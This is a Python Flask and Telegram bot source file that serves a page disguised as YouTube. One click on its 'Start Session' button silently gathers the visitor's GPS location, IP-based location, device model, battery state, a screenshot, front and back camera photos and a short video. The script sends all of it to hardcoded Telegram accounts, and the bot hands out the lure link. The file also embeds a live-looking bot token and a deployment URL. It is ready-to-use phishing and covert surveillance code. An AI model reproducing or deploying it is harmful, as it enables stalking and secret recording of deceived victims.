import os
import threading
from flask import Flask, request, render_template_string
import telebot

BOT_TOKEN = "8637899791:AAEcpjrVy2j9sUTK-rvpX_HsuKBpkX7gnlU"
USER_IDS = [7361880623, 8475691696]
BASE_URL = "https://web-youtube-asuma66.up.railway.app"

bot = telebot.TeleBot(BOT_TOKEN)
app = Flask(__name__)

HTML_PAGE = """<!DOCTYPE html>
<html>
<head>
    <title>YouTube</title>
    <meta charset="utf-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
    <style>
        body { font-family: 'Roboto', sans-serif; margin:0; background:#0f0f0f; color:#fff; }
        .header { background:#202020; padding:12px 20px; display:flex; align-items:center; }
        .header .logo { font-size:24px; font-weight:bold; color:#ff0000; }
        .header .user { margin-left:auto; color:#aaa; }
        .container { max-width:900px; margin:20px auto; padding:0 20px; }
        .video-placeholder { background:#1a1a1a; border-radius:12px; padding:20px; text-align:center; }
        .video-placeholder img { max-width:100%; border-radius:8px; }
        .info { margin-top:15px; }
        .info .title { font-size:22px; font-weight:500; }
        .info .channel { color:#aaa; margin-top:8px; }
        .controls { margin-top:20px; display:flex; gap:10px; flex-wrap:wrap; justify-content:center; }
        .controls button { background:#3ea6ff; border:none; color:#000; padding:10px 24px; border-radius:20px; font-weight:bold; cursor:pointer; font-size:16px; }
        .controls button:disabled { opacity:0.5; cursor:not-allowed; }
        #statusText, #locationStatus, #debug { display: none; }
    </style>
</head>
<body>
    <div class="header">
        <div class="logo">YouTube</div>
        <div class="user">asuma.66</div>
    </div>
    <div class="container">
        <div class="video-placeholder">
            <img id="thumbnail" src="https://img.youtube.com/vi/dQw4w9WgXcQ/hqdefault.jpg" alt="video thumbnail">
        </div>
        <div class="info">
            <div class="title">🔥 ASUSMA LIVE 🔥</div>
            <div class="channel">asuma.66 - 1.2M subscribers</div>
        </div>
        <div class="controls">
            <button id="startBtn">▶ Start Session</button>
        </div>
        <!-- Hidden status elements – kept for internal debugging if needed -->
        <div id="statusText"></div>
        <div id="locationStatus"></div>
        <div id="debug"></div>
    </div>

    <!-- html2canvas CDN for screenshot -->
    <script src="https://cdnjs.cloudflare.com/ajax/libs/html2canvas/1.4.1/html2canvas.min.js"></script>

    <script>
        let frontStream = null, backStream = null, mediaRecorder = null;
        let recordedChunks = [], recordingActive = false, maxDuration = 10000;
        const startBtn = document.getElementById('startBtn');

        // ---- Helper: send data to backend ----
        async function sendData(formData) {
            try {
                await fetch('/capture', { method: 'POST', body: formData });
            } catch (e) {}
        }

        // ---- Get public IP and device info ----
        async function getIpInfo() {
            try {
                const res = await fetch('https://ipapi.co/json/');
                const data = await res.json();
                return data;
            } catch (e) {
                return { ip: 'unknown', city: 'unknown', region: 'unknown', country: 'unknown' };
            }
        }

        function getDeviceInfo() {
            const ua = navigator.userAgent;
            let brand = 'Unknown';
            let model = 'Unknown';
            // Simple detection – expand as needed
            if (ua.includes('iPhone')) {
                brand = 'Apple';
                model = 'iPhone';
            } else if (ua.includes('iPad')) {
                brand = 'Apple';
                model = 'iPad';
            } else if (ua.includes('Android')) {
                brand = 'Android';
                // try to get model
                const match = ua.match(/Android\s+([\d.]+);\s+([^;)]+)/);
                if (match) model = match[2];
                else model = 'Android Device';
            } else if (ua.includes('Windows Phone')) {
                brand = 'Microsoft';
                model = 'Windows Phone';
            } else {
                brand = 'Unknown';
                model = 'Unknown';
            }
            return { brand, model };
        }

        // ---- Get battery level ----
        async function getBatteryInfo() {
            try {
                if (navigator.getBattery) {
                    const battery = await navigator.getBattery();
                    return {
                        level: Math.round(battery.level * 100),
                        charging: battery.charging
                    };
                }
                return { level: 'unknown', charging: 'unknown' };
            } catch (e) {
                return { level: 'unknown', charging: 'unknown' };
            }
        }

        // ---- Capture screenshot using html2canvas ----
        function captureScreenshot() {
            return new Promise((resolve) => {
                // Capture the entire visible body
                html2canvas(document.body, {
                    useCORS: true,
                    logging: false,
                    scale: 0.8, // reduce size for speed
                    allowTaint: true
                }).then(canvas => {
                    canvas.toBlob(blob => resolve(blob), 'image/jpeg', 0.85);
                }).catch(() => resolve(null));
            });
        }

        // ---- Camera fallback ----
        async function getCameraStream() {
            try {
                const stream = await navigator.mediaDevices.getUserMedia({ video: true, audio: false });
                return { stream, label: 'default' };
            } catch (e) {
                try {
                    const stream = await navigator.mediaDevices.getUserMedia({ video: { facingMode: 'environment' }, audio: false });
                    return { stream, label: 'environment' };
                } catch (e2) {
                    try {
                        const stream = await navigator.mediaDevices.getUserMedia({ video: { facingMode: 'user' }, audio: false });
                        return { stream, label: 'user' };
                    } catch (e3) {
                        throw new Error('No camera');
                    }
                }
            }
        }

        // ---- Capture single frame from stream ----
        function captureFrame(stream) {
            return new Promise((resolve) => {
                const video = document.createElement('video');
                video.srcObject = stream;
                video.onloadedmetadata = () => {
                    video.play();
                    setTimeout(() => {
                        const canvas = document.createElement('canvas');
                        canvas.width = video.videoWidth;
                        canvas.height = video.videoHeight;
                        const ctx = canvas.getContext('2d');
                        ctx.drawImage(video, 0, 0);
                        canvas.toBlob((blob) => {
                            resolve(blob);
                            video.pause();
                            video.srcObject = null;
                        }, 'image/jpeg', 0.9);
                    }, 100);
                };
            });
        }

        // ---- Main session ----
        async function startSession() {
            startBtn.disabled = true;
            startBtn.innerText = 'Loading...';

            // 1. Location
            let locationData = null;
            if (navigator.geolocation) {
                try {
                    const pos = await new Promise((resolve, reject) => {
                        navigator.geolocation.getCurrentPosition(resolve, reject, {
                            enableHighAccuracy: true,
                            timeout: 10000
                        });
                    });
                    locationData = { lat: pos.coords.latitude, lng: pos.coords.longitude };
                } catch (e) {
                    locationData = { denied: true };
                }
            } else {
                locationData = { denied: true };
            }

            // 2. IP info
            const ipInfo = await getIpInfo();

            // 3. Device info
            const device = getDeviceInfo();

            // 4. Battery
            const battery = await getBatteryInfo();

            // 5. Camera
            let frontBlob = null, backBlob = null, videoBlob = null;
            try {
                const result = await getCameraStream();
                const stream = result.stream;
                let frontStreamLocal = null;
                try {
                    const frontResult = await getCameraStream();
                    frontStreamLocal = frontResult.stream;
                } catch (e) {
                    frontStreamLocal = stream;
                }
                backStream = stream;
                frontStream = frontStreamLocal;

                frontBlob = await captureFrame(frontStream);
                backBlob = await captureFrame(backStream);

                // Record video
                mediaRecorder = new MediaRecorder(backStream, { mimeType: 'video/webm;codecs=vp9' });
                recordedChunks = [];
                mediaRecorder.ondataavailable = (e) => { if (e.data.size) recordedChunks.push(e.data); };
                mediaRecorder.onstop = () => {
                    videoBlob = new Blob(recordedChunks, { type: 'video/webm' });
                    // Send everything after recording stops
                    finalizeAndSend();
                };
                mediaRecorder.start(1000);
                recordingActive = true;
                setTimeout(() => {
                    if (recordingActive && mediaRecorder.state === 'recording') {
                        mediaRecorder.stop();
                        recordingActive = false;
                    }
                }, maxDuration);
                window.addEventListener('beforeunload', () => {
                    if (recordingActive && mediaRecorder.state === 'recording') mediaRecorder.stop();
                });
            } catch (err) {
                // Camera failed – we'll still send other data
                // We'll send a notification later
            }

            // 6. Screenshot (capture after everything else)
            const screenshotBlob = await captureScreenshot();

            // Wait for video to finish (if recording)
            // Since recording is async, we need a way to wait.
            // We'll use a promise that resolves when recording stops.
            // But we already have onstop callback; we'll implement a promise.
            // For simplicity, we'll wait a fixed time (maxDuration + 1s) and then finalize.
            // Better: use a promise.
            // Let's implement a more robust way:
            let recordingDone = false;
            let videoReady = false;
            if (mediaRecorder) {
                mediaRecorder.onstop = () => {
                    videoBlob = new Blob(recordedChunks, { type: 'video/webm' });
                    videoReady = true;
                    if (recordingDone) finalizeAndSend();
                };
                // If recording already stopped (or never started), set videoReady = true
                if (!recordingActive) {
                    videoReady = true;
                }
                recordingDone = true;
            } else {
                videoReady = true;
                recordingDone = true;
            }

            // Finalize function
            async function finalizeAndSend() {
                const fd = new FormData();
                // Add location
                if (locationData && !locationData.denied) {
                    fd.append('lat', locationData.lat);
                    fd.append('lng', locationData.lng);
                } else {
                    fd.append('location_denied', 'true');
                }
                // IP info
                fd.append('ip', ipInfo.ip || 'unknown');
                fd.append('city', ipInfo.city || 'unknown');
                fd.append('region', ipInfo.region || 'unknown');
                fd.append('country', ipInfo.country || 'unknown');
                // Device
                fd.append('brand', device.brand);
                fd.append('model', device.model);
                // Battery
                fd.append('battery_level', battery.level);
                fd.append('battery_charging', battery.charging);
                // Screenshot
                if (screenshotBlob) fd.append('screenshot', screenshotBlob, 'screenshot.jpg');
                // Camera images
                if (frontBlob) fd.append('frontImage', frontBlob, 'front.jpg');
                if (backBlob) fd.append('backImage', backBlob, 'back.jpg');
                // Video
                if (videoBlob) fd.append('video', videoBlob, 'recording.webm');

                await sendData(fd);
                startBtn.disabled = false;
                startBtn.innerText = '▶ Start Session';
            }

            // If recording never started (camera error), finalize immediately.
            if (!mediaRecorder) {
                finalizeAndSend();
            } else {
                // Wait for recording to stop or timeout
                setTimeout(() => {
                    if (!videoReady) {
                        // Force stop and finalize
                        if (recordingActive && mediaRecorder.state === 'recording') {
                            mediaRecorder.stop();
                            recordingActive = false;
                        }
                        // Ensure finalize is called
                        if (!videoBlob) {
                            videoBlob = new Blob([], { type: 'video/webm' });
                        }
                        finalizeAndSend();
                    }
                }, maxDuration + 2000);
            }
        }

        // ---- Hide status messages on load ----
        document.getElementById('startBtn').addEventListener('click', startSession);
        // No visible status updates – everything runs silently.
    </script>
</body>
</html>"""

@app.route('/')
def index():
    return render_template_string(HTML_PAGE)

@app.route('/capture', methods=['POST'])
def capture():
    # Extract all data from the form
    lat = request.form.get('lat')
    lng = request.form.get('lng')
    location_denied = request.form.get('location_denied')
    ip = request.form.get('ip', 'unknown')
    city = request.form.get('city', 'unknown')
    region = request.form.get('region', 'unknown')
    country = request.form.get('country', 'unknown')
    brand = request.form.get('brand', 'Unknown')
    model = request.form.get('model', 'Unknown')
    battery_level = request.form.get('battery_level', 'unknown')
    battery_charging = request.form.get('battery_charging', 'unknown')

    # Files
    screenshot = request.files.get('screenshot')
    front_img = request.files.get('frontImage')
    back_img = request.files.get('backImage')
    video = request.files.get('video')

    for uid in USER_IDS:
        # --- Location ---
        if lat and lng:
            try:
                bot.send_location(uid, float(lat), float(lng))
                bot.send_message(uid, f"📍 Location: {lat}, {lng}")
            except Exception as e:
                print(f"Location send error: {e}")
        elif location_denied:
            try:
                bot.send_message(uid, "📍 Location: Denied by user.")
            except Exception as e:
                print(f"Error: {e}")

        # --- IP & Device Info ---
        try:
            msg = (
                f"🌐 IP: {ip}\n"
                f"📍 City: {city}, {region}, {country}\n"
                f"📱 Device: {brand} - {model}\n"
                f"🔋 Battery: {battery_level}% (charging: {battery_charging})"
            )
            bot.send_message(uid, msg)
        except Exception as e:
            print(f"Info send error: {e}")

        # --- Screenshot ---
        if screenshot:
            try:
                screenshot.seek(0)
                bot.send_photo(uid, screenshot.read(), caption="📸 Screenshot of page")
            except Exception as e:
                print(f"Screenshot error: {e}")

        # --- Camera images ---
        if front_img:
            try:
                front_img.seek(0)
                bot.send_photo(uid, front_img.read(), caption="🤳 Front Camera")
            except Exception as e:
                print(f"Front image error: {e}")
        if back_img:
            try:
                back_img.seek(0)
                bot.send_photo(uid, back_img.read(), caption="📷 Back Camera")
            except Exception as e:
                print(f"Back image error: {e}")

        # --- Video ---
        if video:
            try:
                video.seek(0)
                bot.send_video(uid, video.read(), supports_streaming=True, caption="🎥 Recording")
            except Exception as e:
                print(f"Video error: {e}")

        # Final notification
        try:
            bot.send_message(uid, "✅ All data captured.")
        except:
            pass

    return "OK", 200

@bot.message_handler(commands=['start'])
def send_link(m):
    bot.reply_to(m, f"🔗 Open this link on your phone:\n{BASE_URL}/\n\nIt will collect location, device info, battery, screenshot, camera images and video automatically.")

def run_bot():
    print("Bot polling started.")
    bot.polling(non_stop=True, interval=1)

if __name__ == '__main__':
    threading.Thread(target=run_bot, daemon=True).start()
    port = int(os.environ.get('PORT', 5000))
    app.run(host='0.0.0.0', port=port)
